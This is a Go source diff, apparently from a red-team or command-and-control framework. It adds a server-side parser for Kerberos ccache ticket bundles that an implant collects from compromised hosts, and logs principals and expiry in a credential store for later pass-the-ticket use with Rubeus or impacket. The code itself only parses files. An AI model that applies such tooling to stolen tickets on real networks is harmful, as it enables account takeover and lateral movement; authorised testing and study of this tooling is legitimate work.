@@ -1,0 +1,183 @@
+package cred
+
+import (
+	"archive/zip"
+	"encoding/json"
+	"fmt"
+	"io"
+	"os"
+	"strings"
+	"time"
+)
+
+// ===== Kerberos 票据缓存制品（MIT ccache 文件集）=====
+//
+// 客户端把本机能读到的 ccache 文件打包成 ZIP（见 implant/core/services/ticket.go）：
+//
+//	manifest.json         {host,user,collected_at,errors,files:[{name,size}]}
+//	tickets/<文件名>       原始 ccache（v3/v4）
+//
+// 服务端**逐条目解析**（ParseCCache）：principal / 票据数 / 最晚到期时间登记进凭据库，
+// 制品本体照样留档，便于后续导入（kinit -c / Rubeus ptt / impacket）。
+//
+// 与 DPAPI 的 ZIP 一样防 ZIP 炸弹：读条目时按 MaxTicketBytes 收口，
+// 不信任中心目录里的 UncompressedSize64。
+
+const (
+	// MaxTicketCaches 单次制品最多登记的缓存数（与客户端 maxCCacheFiles 一致）
+	MaxTicketCaches = 64
+	// MaxTicketBytes 单个 ccache 上限：正常票据文件几十 KB，4MB 已是三个数量级的余量
+	MaxTicketBytes = 4 << 20
+	// MaxTicketArtifactBytes 制品本体上限（ZIP 压缩后）
+	MaxTicketArtifactBytes = 16 << 20
+)
+
+// TicketCache 一个已解析的票据缓存
+type TicketCache struct {
+	File      string `json:"file"`      // ZIP 内条目名
+	Version   int    `json:"version"`   // ccache 版本（3 / 4）
+	Principal string `json:"principal"` // user@REALM（ccache.DefaultPrincipal）
+	Realm     string `json:"realm,omitempty"`
+	Tickets   int    `json:"tickets"`           // 凭据条目数（含服务票据）
+	Expires   string `json:"expires,omitempty"` // 最晚 end_time（UTC，RFC3339）
+}
+
+// TicketArtifact 票据制品（解析结果）
+type TicketArtifact struct {
+	Host        string        `json:"host"`
+	User        string        `json:"user"`
+	CollectedAt string        `json:"collected_at"`
+	Errors      []string      `json:"errors,omitempty"`
+	Caches      []TicketCache `json:"caches"`
+
+	hasManifest bool // 解析时置位；只用于 Info() 标注，不参与序列化
+}
+
+// Info 汇总制品统计（写入任务结果与制品备注）
+func (a TicketArtifact) Info() ArtifactInfo {
+	info := ArtifactInfo{Format: FormatZip, Entries: len(a.Caches), HasManifest: a.hasManifest,
+		TicketCaches: len(a.Caches), SkippedItems: len(a.Errors)}
+	for _, c := range a.Caches {
+		info.Tickets += c.Tickets
+	}
+	return info
+}
+
+// ParseTicketArtifact 解析并校验票据制品。
+//
+// 判定标准与其它制品一致：必须"完整且可用" ——
+// 一个能解出 principal 的 ccache 都没有时显式失败，不登记半截制品。
+func ParseTicketArtifact(path string) (TicketArtifact, error) {
+	var art TicketArtifact
+
+	st, err := os.Stat(path)
+	if err != nil {
+		return art, err
+	}
+	if st.Size() == 0 {
+		return art, fmt.Errorf("制品为空文件")
+	}
+	if st.Size() > MaxTicketArtifactBytes {
+		return art, fmt.Errorf("制品体积超限（%.1f MB > %d MB）",
+			float64(st.Size())/1024/1024, MaxTicketArtifactBytes>>20)
+	}
+
+	zr, err := zip.OpenReader(path)
+	if err != nil {
+		return art, fmt.Errorf("制品不是合法 ZIP: %w", err)
+	}
+	defer zr.Close()
+	if len(zr.File) == 0 {
+		return art, fmt.Errorf("制品里没有任何文件")
+	}
+
+	for _, f := range zr.File {
+		if f.FileInfo().IsDir() {
+			continue
+		}
+		name := f.Name
+
+		// 清单可选：缺失时按条目内容为准，不让一个可选的元信息文件卡住整份战果
+		if strings.EqualFold(name, "manifest.json") {
+			art.hasManifest = true // 解析失败不影响结论：条目内容才是事实来源
+			if raw, rerr := readZipEntry(f, MaxTicketBytes); rerr == nil {
+				var m struct {
+					Host        string   `json:"host"`
+					User        string   `json:"user"`
+					CollectedAt string   `json:"collected_at"`
+					Errors      []string `json:"errors"`
+				}
+				if json.Unmarshal(raw, &m) == nil {
+					art.Host, art.User, art.CollectedAt = m.Host, m.User, m.CollectedAt
+					art.Errors = append(art.Errors, m.Errors...)
+				}
+			}
+			continue
+		}
+
+		lower := strings.ToLower(name)
+		if !strings.HasPrefix(lower, "tickets/") && !strings.HasSuffix(lower, ".ccache") {
+			continue // 无关条目（未来可能加的说明文件）直接忽略
+		}
+		if len(art.Caches) >= MaxTicketCaches {
+			art.Errors = append(art.Errors, fmt.Sprintf("缓存数超过上限 %d，其余条目未解析", MaxTicketCaches))
+			break
+		}
+
+		raw, rerr := readZipEntry(f, MaxTicketBytes)
+		if rerr != nil {
+			art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", name, rerr))
+			continue
+		}
+		cc, perr := ParseCCache(raw)
+		if perr != nil {
+			// 单个缓存坏掉不影响其它缓存，但要显式告诉操作员
+			art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", name, perr))
+			continue
+		}
+		art.Caches = append(art.Caches, TicketCache{
+			File:      name,
+			Version:   cc.Version,
+			Principal: cc.Principal.String(),
+			Realm:     cc.Principal.Realm,
+			Tickets:   len(cc.Credentials),
+			Expires:   ticketExpiry(cc),
+		})
+	}
+
+	if len(art.Caches) == 0 {
+		return art, fmt.Errorf("制品里没有可解析的 ccache（errors: %s）", strings.Join(art.Errors, "；"))
+	}
+	return art, nil
+}
+
+// ticketExpiry 取所有凭据里最晚的 end_time（UTC RFC3339）；全为零值时返回空串。
+func ticketExpiry(cc *CCache) string {
+	var latest time.Time
+	for _, c := range cc.Credentials {
+		if c.EndTime.After(latest) {
+			latest = c.EndTime
+		}
+	}
+	if latest.IsZero() {
+		return ""
+	}
+	return latest.UTC().Format(time.RFC3339)
+}
+
+// readZipEntry 读取 ZIP 条目并做大小收口（不信任中心目录里的长度字段）。
+func readZipEntry(f *zip.File, limit int64) ([]byte, error) {
+	rc, err := f.Open()
+	if err != nil {
+		return nil, err
+	}
+	defer rc.Close()
+	raw, err := io.ReadAll(io.LimitReader(rc, limit+1))
+	if err != nil {
+		return nil, err
+	}
+	if int64(len(raw)) > limit {
+		return nil, fmt.Errorf("条目超过 %d KB 上限", limit>>10)
+	}
+	return raw, nil
+}
